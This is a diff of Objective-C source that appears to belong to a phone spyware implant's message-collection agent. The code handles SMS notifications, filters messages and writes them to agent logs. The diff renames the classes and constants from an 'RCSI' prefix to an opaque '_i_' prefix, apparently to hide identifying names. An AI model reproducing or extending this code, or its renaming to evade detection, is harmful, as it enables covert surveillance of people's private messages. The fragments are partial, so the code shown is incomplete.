@@ -81,7 +81,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
 {  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  RCSIAgentMessages *agentMsg = (RCSIAgentMessages *) observer;
+  _i_AgentMessages *agentMsg = (_i_AgentMessages *) observer;
 
 #ifdef DEBUG  
   NSLog(@"SmsNotificationCallback: notification received %@ with observer %@ and object %@.", 
@@ -119,7 +119,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
 }
 
 
-@interface RCSIAgentMessages (hidden)
+@interface _i_AgentMessages (hidden)
 
 - (BOOL)_parseConfWithData: (id)rawData;
 - (BOOL)_getMessagesWithFilter: (int)filter andMessageType: (int)msgType;
@@ -140,7 +140,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
 
 @end
 
-@implementation RCSIAgentMessages (hidden)
+@implementation _i_AgentMessages (hidden)
 
 - (BOOL)_setAgentMessagesProperty
 {
@@ -1335,7 +1335,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
 
   
   // No additional param header
-  RCSILogManager *logManager = [RCSILogManager sharedInstance];
+  _i_LogManager *logManager = [_i_LogManager sharedInstance];
   
   BOOL success = [logManager createLog: logType
                            agentHeader: nil
@@ -1620,7 +1620,7 @@ typedef struct _message_config_t {
 
 @end
 
-@implementation RCSIAgentMessages 
+@implementation _i_AgentMessages 
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -1655,7 +1655,7 @@ typedef struct _message_config_t {
 #pragma mark Agent Formal Protocol Methods
 #pragma mark -
 
-NSString *kRCSIAgentMessageskRunLoopMode = @"kRCSIAgentMessageskRunLoopMode";
+NSString *k_i_AgentMessageskRunLoopMode = @"k_i_AgentMessageskRunLoopMode";
 
 - (void)getMessagesWithFilter:(NSTimer*)theTimer
 {
@@ -1670,7 +1670,7 @@ NSString *kRCSIAgentMessageskRunLoopMode = @"kRCSIAgentMessageskRunLoopMode";
                                                   userInfo: nil 
                                                    repeats: YES];
   
-  [[NSRunLoop currentRunLoop] addTimer: timer forMode: kRCSIAgentMessageskRunLoopMode];
+  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentMessageskRunLoopMode];
 }
 
 - (void)startAgent
@@ -1707,7 +1707,7 @@ NSString *kRCSIAgentMessageskRunLoopMode = @"kRCSIAgentMessageskRunLoopMode";
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
         
-      [[NSRunLoop currentRunLoop] runMode:kRCSIAgentMessageskRunLoopMode 
+      [[NSRunLoop currentRunLoop] runMode:k_i_AgentMessageskRunLoopMode 
                                beforeDate:[NSDate dateWithTimeIntervalSinceNow: 1.0]];
     
       [innerPool release];
